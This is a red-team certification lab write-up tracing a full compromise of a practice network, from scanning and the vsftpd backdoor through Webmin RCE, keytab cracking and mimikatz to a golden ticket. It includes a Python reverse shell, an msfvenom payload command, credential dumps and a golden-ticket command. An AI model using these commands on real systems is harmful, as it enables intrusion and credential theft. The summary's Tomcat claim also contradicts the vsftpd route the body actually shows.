# Introduction 
This report documents the activities carried out during a Red Teaming simulation conducted for evaluation purposes as part of the Certified Red Team Analyst (CRTA) certification. The main objective of this operation was to replicate techniques, tactics, and procedures (TTPs) used by real-world threat actors to assess the security posture of a simulated enterprise environment. A structured offensive methodology was applied throughout the assessment, covering phases such as reconnaissance, exploitation, privilege escalation, persistence, and exfiltration, all within the boundaries defined by the certification scope. This document outlines the findings, successful attack vectors, techniques used, and recommendations to mitigate the identified risks. 

# Scope 
Initial Access SCOPE of Engagement: - 172.16.25.0/24 [ONLY 172.16.25.1 is out of scope] - 10.10.10.0/25 [ONLY 10.10.10.1 is out of scope] 

# Executive Summary 
This Red Team engagement was conducted as part of the Certified Red Team Analyst (CRTA) certification, simulating a real-world adversary with the objective of gaining access to a sensitive file: secret.xml. The assessment focused on identifying weaknesses within a segmented enterprise environment and exploiting them to demonstrate potential business impact. Objective Gain access to the file secret.xml located in one of the internal servers, documenting each step used to achieve this goal. 

# Key Techniques & Findings 

Initial Access: Achieved via Apache Tomcat Manager (port 8180), using default credentials and exploiting the tomcat_mgr_upload vulnerability.

Privilege Escalation: Local privilege escalation was performed by abusing a misconfigured find binary with SUID permissions, granting root access.

# Credential Discovery: 
Multiple sensitive credentials were discovered in plaintext and via tools like linPEAS, Mimikatz, and keytabextract. 

● Internal Pivoting: Routing through the compromised host enabled lateral movement into the internal network (10.10.10.0/25). 

● Webmin RCE: Successful exploitation of Webmin (CVE-2019-15107) resulted in further system compromise with root access. 

● Active Directory Exploitation: Kerberos tickets were forged using a Golden Ticket attack after extracting the necessary krbtgt hash. 

● Final Objective: The secret.xml file was successfully located and exfiltrated from the domain controller, completing the challenge. 

# Impact Demonstrated
This simulation revealed critical misconfigurations and legacy software versions that enabled full domain compromise, including: 

● Remote Code Execution (RCE) 

● Privilege Escalation 

● Lateral Movement 

● Domain Persistence via Golden Ticket Recommendation Overview 

● Remove or secure Tomcat Manager interfaces. 

● Eliminate use of default credentials. 

● Harden Linux permissions and remove unnecessary SUID binaries. 

● Patch vulnerable services (e.g., Webmin). 

● Improve internal segmentation and monitoring. 

● Regularly rotate and manage credentials securely.


# Exploitation Path

Initial Access → Production-Server (172.16.25.11) The first step is to identify which machines are accessible within the network:

```python
nmap -sn 172.16.25.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 12:39 CDT
Nmap scan report for 172.16.25.1
Host is up (0.078s latency).
Nmap scan report for 172.16.25.2
Host is up (0.16s latency).
Nmap scan report for 172.16.25.3
Host is up (0.17s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 12.22 seconds
```

# Nmap
We attempted to gather more detailed information about the open ports.

```python
sudo nmap -sS -p- --min-rate 2000 172.16.25.2 -n -Pn
```

![[Pasted image 20250512142719.png]]

We performed a scan on each IP to gather information about open ports and available services:

# Ports Version 
```python 
nmap -p21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,3306,36,32,5432,5900,6000,6200,6667,6697,8009,8180,8787,37198,41564,56126,59201 -sCV 172.16.25.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 13:28 CDT
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.51% done; ETC: 13:32 (0:00:00 remaining)
Nmap scan report for 172.16.25.2
Host is up (0.16s latency).

PORT      STATE  SERVICE     VERSION
21/tcp    open   ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.250.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open   telnet?
25/tcp    open   smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
32/tcp    closed unknown
36/tcp    closed unknown
53/tcp    open   domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Register
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp   open   rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      35328/tcp   mountd
|   100005  1,2,3      41195/udp   mountd
|   100021  1,3,4      38205/udp   nlockmgr
|   100021  1,3,4      60571/tcp   nlockmgr
|   100024  1          35424/tcp   status
|_  100024  1          50192/udp   status
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open   netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open   exec        netkit-rsh rexecd
513/tcp   open   login?
514/tcp   open   shell       Netkit rshd
1099/tcp  open   java-rmi    GNU Classpath grmiregistry
1524/tcp  open   bindshell   Bash shell (**BACKDOOR**; root shell)
2049/tcp  open   nfs         2-4 (RPC #100003)
3306/tcp  open   mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 20
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression
|   Status: Autocommit
|_  Salt: 9h!hka$,P1A4}=W{*Zi~
5432/tcp  open   postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2025-04-25T03:00:48+00:00; -17d15h32m15s from scanner time.
5900/tcp  open   vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open   X11         (access denied)
6200/tcp  closed lm-x
6667/tcp  open   irc         UnrealIRCd
6697/tcp  open   irc         UnrealIRCd
8009/tcp  open   ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open   http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
8787/tcp  open   drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
37198/tcp closed unknown
41564/tcp closed unknown
56126/tcp closed unknown
59201/tcp closed unknown
Service Info: Hosts:  metasploitable.localdomain, Production-Server, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -17d14h12m14s, deviation: 2h18m34s, median: -17d15h32m15s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-24T22:59:24-04:00
|_nbstat: NetBIOS name: PRODUCTION-SERV, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 254.13 seconds
```


We observed several services running outdated versions that may be vulnerable to exploitation.


However, in this specific case, we will focus on exploiting port: 

```python
21/tcp    open   ftp         vsftpd 2.3.4
```


![[Pasted image 20250512145644.png]]

# Find a functional exploit 
We launched Metasploit and searched for exploits related to this version of Tomcat.

We properly configured the exploit:
```python
> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.25.2

> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

This exploit run a Backdoor Command Execution and provides us with a root shell

![[Pasted image 20250512145918.png]]

### Vulnerability

| CVE-XXXX-XXXXX | Name of vulnerability      | level         | Link                                                                      |
| -------------- | -------------------------- | ------------- | ------------------------------------------------------------------------- |
| CVE-2011-2523  | Backdoor Command Execution | ==10.0/HIGH== | [[[NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)]] |
|                |                            |               |                                                                           |
|                |                            |               |                                                                           |

# mitigation
For CVE-2011-2523, the mitigation involves the following steps:

```python
Upgrade: Immediately upgrade to a non-vulnerable version of vsftpd beyond 2.3.4.

Patch Verification: Validate that the updated version does not contain the backdoor.
```

# Privilege Escalation

No additional privilege escalation was required, as the exploited vulnerability (CVE-2011-2523) in vsftpd 2.3.4 resulted in immediate remote access with root-level privileges.

We can see that the root user has ALL-ALL permits
![[Pasted image 20250512150323.png]]

After receiving a shell from the previously executed exploit, we upgraded to a bash shell

First we are going to create a Crontab task that executes a reverse Shell every 1 minute
![[Pasted image 20250512163457.png]]

We use this reverse Shell written in Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.250.11",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

And finally we will be listening to the port we have selected. In this case the port 9001. We can see that we belong to another network interface 
![[Pasted image 20250512162449.png]]

# Credential leak

#Nota: Some of these credentials were tested in the webmin service in port 1000 and we got access

![[Pasted image 20250512164302.png]]

# Database Information

While exploring the compromised machine, I found sensitive data, which is presented below

```python
mysql -u root
```

```python
use dvwa;
```

```python
selec * from users;
```

![[Pasted image 20250512165114.png]]

We successfully cracked the hashes using crackstation.

| user_id | first_name | last_name | user    | password     |
| ------- | ---------- | --------- | ------- | ------------ |
| 1       | admin      | admin     | admin   | ==password== |
| 2       | Gordon     | Brown     | gordonb | ==abc123==   |
| 3       | Hack       | Me        | 1337    | ==charley==  |
| 4       | Pablo      | Picasso   | pablo   | ==letmein==  |
| 5       | Bob        | Smith     | smithy  | ==password== |


![[Pasted image 20250512165408.png]]

# Network Pivoting 

The target network `10.10.10.0/24` is directly reachable through the VPN tunnel (`tun0`) via the gateway `172.16.250.1`, as shown in the routing table. Therefore, no lateral movement or pivoting through intermediate hosts

![[Pasted image 20250513132613.png]]

After listing and performing different types of scan we can identify a route to advance
![[Pasted image 20250512181147.png]]

# Exploitation through the second network interface

# Nmap


```python
sudo nmap -p- -sCV --open -Pn -n 10.10.10.3
```

We can identify a vulnerability in port 10000/TCP Open HTTP Miniserv 1.953 (Webmin HTTPD)
![[Pasted image 20250512192250.png]]

We verify the web and we have a login panel in which we tested the credentials that we get previously and get access to the web
![[Pasted image 20250513134446.png]]

webmin dashboard
![[Pasted image 20250513134631.png]]

We perform a search and find that this service is vulnerable to Package Updates Remote Command Execution

searched for exploits related to Webmin. 
```pyhton
search webmin
```

I found an exploit that works very well.
```python
use exploit/linux/http/webmin_packageup_rce
```

We used the previously discovered credentials to configure the exploit.
```python
> set USERNAME support 
```

```python
> set PASSWORD support@123
```

```python
> set lhost 172.16.250.11
```

```python
> set rhost 10.10.10.3
```

```python
> set lport 4442
```

enabled SSL.
```python
msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true
```

It’s important to use this specific payload, as the others caused errors when attempting to upgrade the shell.
```python
msf6 exploit(linux/http/webmin_packageup_rce) > set payload cmd/unix/bind_netcat
```


![[Pasted image 20250513135727.png]]

# Remote Code Execution (RCE) in Webmin - CVE-2019-15107

We successfully received a root shell
![[Pasted image 20250512192320.png]]

We upgraded to a bash shell
![[Pasted image 20250512192545.png]]

We are going to obtain a persistence creating a crontab task that executes a root shell every minute
![[Pasted image 20250512192954.png]]

After searching thoroughly, we find an interesting file and create a Python server to download it
![[Pasted image 20250512193149.png]]

We find a github tool that allows us to extract information from Type .Keytab Files, which may be used to authenticate linux machine to kerberos. The Script Will Extract Information Such as The Realm, main service, Encryption Type and NTLM HASH. https://github.com/sosdave/KeyTabExtract.git

![[Pasted image 20250512193909.png]]

After obtaining the hash NTLMV2 decrypte it and we get a key 
![[Pasted image 20250512194413.png]]

We used the credentials extracted from the keytab file.
![[Pasted image 20250512194651.png]]

They are valid for WinRM (Windows Remote Management).
![[Pasted image 20250512194902.png]]


They also work with PsExec.

```python
impacket-psexec 'child-admin:R0cky!@#$%@10.10.10.2'
```

![[Pasted image 20250512195600.png]]


In this step I built a payload to get a meterpreter in Metaesploit and Dumpear Credentials

```python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.250.11 LPORT=9005 -f exe -o reverse.exe
```

![[Pasted image 20250512200042.png]]

We uploaded the EXE using the upload command in Evil-WinRM and configured msfconsole accordingly. It’s important to use the same payload in Metasploit as the one used when generating the EXE with msfvenom.

```python
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

```python
set LHOST 172.16.250.11
```

```python
set LPORT 9005
```

```python
run
```

```python
.\exp.exe
```
![[Pasted image 20250512201912.png]]

![[Pasted image 20250512201519.png]]


mimikats

![[Pasted image 20250512202312.png]]


![[Pasted image 20250512202334.png]]

subimos el mimikatz para obtener mas informacion
![[Pasted image 20250512203353.png]]


subimos el powerview
![[Pasted image 20250512210444.png]]

S-1-5-21-2332039752-785340267-2377082902


```python
kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
```


![[Pasted image 20250512211423.png]]

```python
dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
```

```python
type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
```


![[Pasted image 20250512212141.png]]